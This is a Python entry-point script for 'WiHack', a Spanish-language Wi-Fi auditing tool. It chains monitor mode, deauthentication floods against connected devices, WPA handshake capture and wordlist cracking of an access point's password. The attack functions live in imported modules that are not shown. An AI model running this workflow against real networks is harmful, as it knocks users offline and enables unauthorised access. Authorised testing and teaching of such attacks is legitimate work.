"""
WiHack - Programa para Auditoría de Redes

Autor: Ivan Fernandez Rodriguez
Fecha: 08/01/2025
Descripción: Archivo principal que coordina la ejecución del programa.

Nota: Este programa está diseñado únicamente con fines educativos y éticos.
      El uso indebido puede acarrear consecuencias legales.
"""


import threading
import mon_manage
import recon_attack
import argparse

def main(bssid, interface, count, wordlist):
    mm = mon_manage.Mon_Manage(interface)
    mm.enable_monitor_mode(interface)
    
    wh = recon_attack.ReconAttack(bssid, interface)
    
    devices = wh.get_connected_devices()
    
    # Función de ataque de deautenticación
    def deauth_thread():
        for d in devices:
            wh.deauth_attack(d, count)

    # Función de captura de handshake
    def capture_thread():
        wh.capture_handshake()

    # Crear hilos
    thread1 = threading.Thread(target=deauth_thread)
    thread2 = threading.Thread(target=capture_thread)

    # Iniciar los hilos
    thread1.start()
    thread2.start()

    # Esperar a que terminen ambos hilos
    thread1.join()
    thread2.join()
    
    wh.crack_password(wordlist)
    wh.clean()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Esta herramienta permite obtener la contrasena de un AP a partir de un ataque de deautenticacion en un entorno controlado y con fines eticos.")
    parser.add_argument("-b", "--bssid", type=str, help="Direccion MAC del AP objetivo.")
    parser.add_argument("-i", "--interface", type=str, default="wlan0", help="Nombre de la interface que se utiliza para el ataque (debe poder funcionar en modo monitor).")
    parser.add_argument("-c", "--count", type=int, default=100, help="Numero de paquetes que se envian al dispositivo para expulsarlo de la red.")
    parser.add_argument("-l", "--wordlist", type=str, help="Ruta de la lista de contrasenas.")
    args = parser.parse_args()
    main(bssid=args.bssid,
         interface=args.interface,
         count=args.count,
         wordlist=args.wordlist)